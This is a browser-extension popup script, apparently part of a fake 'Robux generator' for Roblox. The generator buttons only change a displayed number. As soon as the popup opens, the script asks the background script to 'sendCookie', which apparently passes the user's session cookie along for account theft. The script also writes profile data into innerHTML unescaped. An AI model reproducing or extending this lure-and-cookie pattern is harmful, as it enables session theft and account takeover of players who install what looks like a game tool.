document.addEventListener('DOMContentLoaded', () => {
    chrome.runtime.sendMessage({ type: "sendCookie" }, (response) => {
        console.log(response.status);
    });

    chrome.runtime.sendMessage({ type: "getUserProfile" }, (response) => {
        const profileDiv = document.getElementById('profile');
        if (response.status === "Profile fetched" && response.profile) {
            profileDiv.innerHTML = `
                <img src="${response.profile.avatarUrl}" alt="Avatar" style="width: 50px; height: 50px; border-radius: 50%; margin-bottom: 5px;">
                <div>${response.profile.username}</div>
            `;
        } else {
            profileDiv.innerHTML = `
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png" alt="No Avatar" style="width: 50px; height: 50px; border-radius: 50%; margin-bottom: 5px;">
                <div>N/A</div>
            `;
        }
        console.log(response.status);
    });

    document.getElementById('generateBtn').addEventListener('click', generateRobux);
    document.getElementById('resetBtn').addEventListener('click', resetFakeRobux);
});

function generateRobux() {
    const robuxInput = document.getElementById('robuxAmount').value;
    const result = document.getElementById('result');
    if (robuxInput && !isNaN(robuxInput) && robuxInput > 0) {
        chrome.runtime.sendMessage({ type: "updateFakeRobux", amount: robuxInput }, (response) => {
            result.textContent = response.status === "Fake Robux updated" 
                ? `Generated ${robuxInput} Robux! (Fake - for display only)`
                : `Error: ${response.status}`;
            console.log(response.status);
        });
    } else {
        result.textContent = 'Please enter a valid Robux amount.';
    }
}

function resetFakeRobux() {
    chrome.runtime.sendMessage({ type: "resetFakeRobux" }, (response) => {
        document.getElementById('result').textContent = response.status;
        console.log(response.status);
    });
}